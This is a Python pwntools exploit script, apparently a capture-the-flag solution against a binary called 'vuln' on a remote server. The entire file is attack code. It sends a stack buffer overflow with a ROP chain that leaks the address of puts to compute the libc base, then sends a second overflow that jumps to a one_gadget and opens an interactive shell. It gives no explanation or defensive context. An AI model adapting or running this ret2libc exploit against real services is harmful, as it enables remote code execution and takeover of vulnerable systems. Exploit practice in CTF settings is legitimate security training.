#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# context(log_level="debug", arch="amd64", os="linux")
# p = process('./vuln')
p = remote('35.188.73.186', 1111)
elf = ELF('./vuln', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
addr_rdi_ret = 0x401223  # pop rdi ; ret
addr_main = 0x401146

# gdb.attach(p, "b *0x4011B5\nc")
pd = 'a' * 0x108
pd += p64(addr_rdi_ret)
pd += p64(got_puts)
pd += p64(plt_puts)
pd += p64(addr_main)
p.sendafter('What do you want me to echo back> \n', pd)
p.recvuntil('a' * 0x108)
p.recv('\x0a')

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr_puts - libc.sym['puts']
libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
addr_one_gadget = libcbase + libc_one_gadget[0]

pd = 'a' * 0x108
pd += p64(addr_one_gadget)
p.sendafter('What do you want me to echo back> \n', pd)
success('addr_puts = ' + hex(addr_puts))
p.interactive()
